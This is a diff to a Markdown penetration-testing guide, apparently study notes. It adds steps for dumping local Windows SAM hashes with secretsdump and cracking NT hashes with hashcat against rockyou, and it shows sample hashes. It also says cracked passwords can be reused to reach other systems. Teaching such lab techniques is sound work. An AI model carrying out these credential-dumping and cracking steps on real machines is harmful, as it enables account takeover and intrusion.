@@ -1790,6 +1790,8 @@ There are three registry hives we can copy if we have local administrative acces
 | `HKLM\SYSTEM`  | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes. |
 | `HKLM\SECURITY`| Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
 
+</details>
+
 1. **Use reg.exe to save copies of the registry hives *(requires launching cmd.exe with administrative privileges)***
 
     **Target Machine:** Save the contents of the HKLM\SAM registry hive to a file named 'sam.save' on the C:\ drive
@@ -1842,9 +1844,40 @@ There are three registry hives we can copy if we have local administrative acces
     python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
     ```
 
+    Notice the following line:
+
+    ```bash
+    # Dumping local SAM hashes (uid:rid:lmhash:nthash)
+    ```
+
+    This tells us how to interpret the output and which hashes we can attempt to crack. 
+    
+    With this in mind, we can extract the NT hashes for each user account into a text file and begin the password cracking process. Keeping track of which hash belongs to which user is helpful for organizing and interpreting the results.
+
     > **NOTE:** The first step secretsdump performs is retrieving the system bootkey, which is required to decrypt the local SAM hashes. This is because the bootkey is used to encrypt and decrypt the SAM database. Without access to it, the hashes cannot be decrypted—making it essential to have copies of the relevant registry hives, as previously discussed.
 
-</details>
+4. **Crack the hashes with Hashcat**
+
+    **Attack Machine:** Populate a text file with the NT hashes we were able to dump
+
+    ```bash
+    nano windowshashes.txt
+
+    # 64f12cddaa88057e06a81b54e73b949b
+    # 31d6cfe0d16ae931b73c59d7e0c089c0
+    # 6f8c3f4d3869a10f3b4f0522f537fd33
+    # 184ecdda8cf1dd238d438c4aea4d560d
+    # f7eb9c06fafaa23c4bcf22ba6781c1e2
+    ```
+
+    **Attack Machine:** Run Hashcat against NT hashes
+
+    ```bash
+    sudo hashcat -m 1000 windowshashes.txt /usr/share/wordlists/rockyou.txt
+    ```
+
+    Obtaining these passwords can be valuable in several ways. For instance, the cracked credentials might allow us to access other systems on the network—especially since password reuse across different work or personal accounts is common. Understanding and applying this technique is particularly useful during assessments and can be leveraged whenever we compromise a vulnerable Windows system and obtain administrative privileges to dump the SAM database.
+
 
 </details>
 
